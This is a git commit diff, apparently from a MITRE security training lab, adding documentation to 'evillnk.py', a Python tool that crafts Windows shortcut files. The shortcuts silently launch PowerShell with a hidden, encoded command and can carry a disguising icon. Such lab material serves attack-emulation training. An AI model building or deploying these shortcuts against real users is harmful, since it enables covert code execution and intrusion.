b7913b3779a6402b086144b85ac30aff4a0b49b8
Govardhen Arunagiri <garunagiri@mitre.org>
2021-08-11 15:52:49 -0400

    added documentation to evillnk.py along with output strings

--- labs/lab_4.2/evillnk.py
+++ labs/lab_4.2/evillnk.py
@@ -6,7 +6,13 @@ import argparse
 from datetime import datetime
 
 
-def create_lnk(name, target, args, icon, icon_index):
+def create_lnk(name, target, args, icon, icon_index): 
+    """
+    This function creates the LNK object and populates it with the path information of the target executable.
+    The path needs to be inserted into the LNK object both as the whole string and as a series of 'Entry' objects, each of which contains one segment of the path.
+    It calls insert_info to fill in the arguments to the target and various additional information needed to construct an LNK file.
+    """
+
     target_split = target.split('\\')
     target_file = target_split[-1]
     target_drive = target_split[0]
@@ -33,6 +39,10 @@ def create_lnk(name, target, args, icon, icon_index):
 
 
 def insert_info(lnk, target_full, target_directory, args, icon, icon_index=0):
+    """
+    This function inserts the target path strings, arguments to pass to the target, file icon information, and various other values into the LNK object.
+    """
+
     lnk.specify_local_location(target_full)
 
     lnk._link_info.size_local_volume_table = 0
@@ -53,6 +63,10 @@ def insert_info(lnk, target_full, target_directory, args, icon, icon_index=0):
 
 
 def build_entry(name, is_dir):
+    """
+    This helper function builds an 'Entry' object for a single path segment to be inserted into the LNK file.
+    """
+
     entry = pylnk3.PathSegmentEntry()
     entry.type = pylnk3.TYPE_FOLDER if is_dir else pylnk3.TYPE_FILE
     entry.file_size = 0
@@ -69,11 +83,13 @@ def build_entry(name, is_dir):
 
 
 def write_lnk(lnk):
+
     with open(lnk.file, 'wb') as f:
         lnk.write(f)
 
 
 def parse_arguments():
+
     parser = argparse.ArgumentParser(prog='evillnk.py', description='Create an evil lnk that executes PowerShell with arguments')
     parser.add_argument('-n', '--name', required=True, action='store', help='Name of the shortcut file')
     parser.add_argument('-c', '--command', required=True, action='store', dest='command', help='Encoded command to execute with PowerShell. Will be executed as: powershell -noni -noe -WindowStyle hidden -e <command>')
@@ -82,12 +98,15 @@ def parse_arguments():
     args = parser.parse_args()
     return args
 
+
 def main():
     
     args = parse_arguments()
     target = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
     arguments = '-noni -noe -WindowStyle hidden -e ' + args.command
+    print('[+] Creating an LNK file containing the following command: {} {}'.format(target, arguments))
     create_lnk(args.name, target, arguments, args.icon, args.index)
+    print('[+] LNK file created: ' + args.name)
 
 
 if __name__ == '__main__':
